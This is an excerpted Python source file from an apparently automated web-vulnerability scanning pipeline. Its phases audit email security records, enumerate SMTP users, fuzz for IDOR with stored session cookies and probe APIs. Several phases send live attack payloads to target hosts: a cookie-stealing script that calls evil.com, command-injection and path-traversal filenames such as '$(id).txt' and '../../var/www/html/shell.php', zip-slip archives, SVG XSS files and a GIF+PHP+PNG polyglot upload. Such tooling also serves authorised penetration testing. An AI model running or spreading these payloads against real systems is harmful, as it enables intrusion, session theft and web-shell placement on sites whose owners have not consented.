...
async def phase_59_EMAIL_SEC(
    ...
    if spf_found:
        for spf in spf_found:
            if "~all" in spf:
                ...
                findings.append(
                    f"[spf-weak] {domain} — SPF uses ?all/+all (neutral/pass-all): {spf[:200]}"
                )
            else:
    ...
    if dmarc_found:
        for dmarc in dmarc_found:
            ...
            if "p=reject" in dmarc_lower:
                ...
                findings.append(
                    f"[dmarc-quarantine] {domain} — DMARC policy=quarantine: {dmarc[:200]}"
                )
            elif "p=none" in dmarc_lower:
                findings.append(
                    f"[dmarc-none] {domain} — DMARC policy=none (monitoring only): {dmarc[:200]}"
                )
            else:
    ...
    for prefix in [
        ...
        if dkim_records:
            findings.append(
                f"[dkim-present] {domain} — DKIM key found at {prefix}: {dkim_records[0][:100]}"
            )
            break
    else:
    ...
    for smtp_host in smtp_targets:
        ...
        for port in (25, 587, 465, 2525):
            try:
                ...
                findings.append(
                    f"[smtp-open] {smtp_host_clean}:{port} — SMTP banner: {banner[:100].strip()}"
                )
                for cmd in _SMTP_COMMANDS:
                    try:
                        ...
                        if any(code in resp for code in ["250", "251", "252"]):
                            findings.append(
                                f"[smtp-enum] {smtp_host_clean}:{port} — {cmd_filled} — {resp[:80].strip()}"
                            )
                    except Exception:
                        continue
                sock.close()
        ...
        for header_name in log_headers:
            for payload in _LOG_INJECT_PAYLOADS[:3]:
                try:
                    ...
                    if s in (200, 201):
                        findings.append(
                            f"[log-inject-header] https://{host_clean}/ — header={header_name} — HTTP {s}"
                        )
                        break
                except Exception:
                    continue
...
_DOC_ATTACK_PAYLOADS = [
    ...
    (
        "html",
        "<html><body><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></body></html>",
    ),
]
    ...
    for host in hosts[:10]:
        ...
        for scheme in ("https://", "http://"):
            ...
            for endpoint in _DOC_ATTACK_ENDPOINTS:
                ...
                try:
                    req = urllib.request.Request(
                        url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers}
                    )
                    ...
                    for fmt, payload in _DOC_ATTACK_PAYLOADS:
                        try:
                            ...
                            ps, pheaders, pbody = await _async_urlopen(
                                _d_urlopen, post_req, timeout=10
                            )
                            ...
                            if "error" in pbody_str.lower() and any(
                                kw in pbody_str.lower()
                                for kw in ["parse", "invalid", "malformed", "unexpected"]
                            ):
                                findings.append(
...
async def phase_64_IDEMPOTENCY(
            ...
            for ln in read_lines(fuzz_file):
                ...
                for p in parts:
                    if p.startswith("http") and any(
                        m in p.lower() for m in ("/api/", "/v1/", "/v2/")
                    ):
    ...
    for endpoint in targets:
        for header_name in _IDEMPOTENCY_HEADERS:
            key = f"vulnforge-replay-{hashlib.md5(endpoint.encode()).hexdigest()[:8]}"
            ...
            modified_body = json.dumps(
                {"test": True, "ts": str(datetime.now()), "modified": True}
            ).encode()
            try:
...
async def phase_67_PATHNORM(
    ...
    targets = [
        h
        for h in (
            read_lines(outdir / "host_targets.txt")
            if (outdir / "host_targets.txt").exists()
            else read_lines(outdir / "hosts.txt")
            if (outdir / "hosts.txt").exists()
            else []
        )
    ][: _PIPELINE_CFG.sample_hosts_ssl]
        ...
        for path, method, body in enum_paths:
            async with _ae_sem:
                ...
                try:
                    ...
                    findings.append(
                        f"[probed] {method} {url} → HTTP {status} len={resp_len} time={resp_time}"
                    )
                except urllib.error.HTTPError as e:
...
async def phase_75_MOBILEAPI(
    ...
    for fb_url in firebase_tests:
        ...
        try:
            req = urllib.request.Request(
                fb_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_mb_headers}
            )
            ...
            for path in paths_to_probe:
                ...
                try:
                    baseline_req = urllib.request.Request(
                        url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_ck_headers}
                    )
                    _, baseline_headers, _ = await _async_urlopen(
                        _ck_urlopen, baseline_req, timeout=10
                    )
...
async def phase_78_FILEUPLOADADV(
    ...
    # Active zip slip test on first upload endpoint
    _fu_urlopen = _get_urlopener()
    _fu_extra = _extra_headers_dict()
    for ep in upload_urls[:3]:
        try:
            ...
            _boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            body_parts = [
                f"--{_boundary}\r\n"
            ...
            zs, _, _ = await _async_urlopen(_fu_urlopen, req, timeout=15)
            if zs in (200, 201):
                findings.append(f"[zip-slip-active] {ep} — zip with ../ entry uploaded (HTTP {zs})")
        except Exception:
            pass

        # Active filename injection test
        for inj_name in ["../../var/www/html/shell.php", "file;ls;.txt", "$(id).txt"]:
            try:
                _boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                body_parts = [
                    f"--{_boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{inj_name}"\r\n'
                ...
                inj_s, _, inj_b = await _async_urlopen(_fu_urlopen, req, timeout=15)
                if inj_s in (200, 201):
                    findings.append(
                        f"[filename-injection-active] {ep} — filename={inj_name} uploaded (HTTP {inj_s})"
                    )
            except Exception:
                continue

        # Active SVG XSS test
        for svg_fname, svg_content in [
            (
                "xss_onload.svg",
            ...
            try:
                ...
                body_parts = [
                    f"--{_boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{svg_fname}"\r\n'
                ...
                svg_s, _, _ = await _async_urlopen(_fu_urlopen, req, timeout=15)
                if svg_s in (200, 201):
                    findings.append(
                        f"[svg-xss-active] {ep} — {svg_fname} uploaded (HTTP {svg_s}) — verify XSS"
                    )
            except Exception:
                continue
        ...
        try:
            ...
            body_parts.append(jpeg_data.decode("latin-1"))
            body_parts.append(f"\r\n--{_boundary}--\r\n")
            body = "".join(body_parts).encode("latin-1")
            req = urllib.request.Request(
                ep,
            ...
            exif_s, _, exif_b = await _async_urlopen(_fu_urlopen, req, timeout=15)
            exif_text = exif_b.decode("utf-8", errors="ignore").lower()
        ...
        try:
            ...
            body_parts.append(large_body.decode("latin-1"))
            body_parts.append(f"\r\n--{_boundary}--\r\n")
            body = "".join(body_parts).encode("latin-1")
            req = urllib.request.Request(
                ep,
            ...
            cr_s, _, _ = await _async_urlopen(_fu_urlopen, req, timeout=15)
            if cr_s in (200, 201):
                findings.append(
                    f"[content-range-bypass] {ep} — upload accepted with Content-Range header (HTTP {cr_s}) — size limit bypass possible"
                )
        except Exception:
            pass
        ...
        try:
            ...
            body_parts = [
                f"--{_boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="triple.gif"\r\n'
                f"Content-Type: image/gif\r\n\r\n"
            ]
            body_parts.append(polyglot.decode("latin-1"))
            body_parts.append(f"\r\n--{_boundary}--\r\n")
            body = "".join(body_parts).encode("latin-1")
            req = urllib.request.Request(
                ep,
            ...
            tri_s, _, _ = await _async_urlopen(_fu_urlopen, req, timeout=15)
            if tri_s in (200, 201):
                findings.append(
                    f"[polyglot-triple] {ep} — GIF+PHP+PNG tri-polyglot uploaded (HTTP {tri_s})"
                )
        except Exception:
            pass
...
async def phase_81_IDORFUZZ(
    ...
    with _CREDENTIAL_LOCK:
        _id_cookie_a = _CREDENTIAL_STORE.get("COOKIE_A", "")
        _id_cookie = _CREDENTIAL_STORE.get("COOKIE", "")
    cookie_a = (getattr(cfg, "idor_session_a", "") or "") or (_id_cookie_a or _id_cookie)
    with _CREDENTIAL_LOCK:
                    ...
                    for pval in variations.get(pname.lower(), ["1", "2"]):
                        ...
                        for session_label, session_cookie in [("A", cookie_a), ("B", cookie_b)]:
                            ...
                            try:
                                ...
                                req = urllib.request.Request(
                                    test_url, method="GET", headers=sess_headers
                                )
                                status_a, headers_a, body_bytes_a = await _async_urlopen(
                                    _id_urlopen, req, timeout=10
                                )
                                findings.append(
                                    f"[idor-{session_label}] {test_url} → HTTP {status_a} len={len(body_bytes_a)}"
                                )
                            except urllib.error.HTTPError as e:
                                findings.append(
                                    f"[idor-{session_label}] {test_url} → HTTP {e.code}"
                                )
                            except Exception:
                                pass
    # UUID v1 timestamp extraction on ID-bearing URLs
    _id_uuid_v1_findings: List[str] = []
                ...
                if len(v) == 36 and v.count("-") == 4:
                    try:
                        ...
                        if uobj.version == 1:
                            ...
                            _id_uuid_v1_findings.append(
                                f"[uuid-v1] {u} — UUID v1: {v} timestamp={ts_str}"
                            )
                    except Exception:
                        continue
    findings.extend(_id_uuid_v1_findings)

    # Hash-based ID detection
    _hash_patterns = [
        (r"^[A-Za-z0-9_-]{20,}={0,2}$", "base64url"),
        (r"^[0-9a-f]{32}$", "MD5"),
        (r"^[0-9a-f]{40}$", "SHA1"),
        (r"^[0-9a-f]{64}$", "SHA256"),
    ]
    for u in target_urls[:20]:
        ...
        for vals in qs.values():
            for v in vals:
                ...
                for pat, desc in _hash_patterns:
                    if re.match(pat, clean):
                        findings.append(f"[hash-id] {u} — ID looks like {desc}: {clean[:30]}")
                        break

    # Incremental ID enumeration on first target
    if target_urls:
        for u in target_urls[:1]:
            ...
            if not qs:
                continue
            for pname in qs:
                if pname.lower() not in idor_sensitive_params:
                    continue
                found_first = None
                for candidate in range(1, 30):
                    ...
                    try:
                        req = urllib.request.Request(
                            test_url,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_id_headers},
                        )
                        ...
                        if es == 200 and len(eb) > 100:
                            if found_first is None:
                                ...
                                findings.append(
                                    f"[idor-enum] {test_url} — sequential ID found {found_first}-{candidate}"
                                )
                                break
                    except Exception:
                        continue
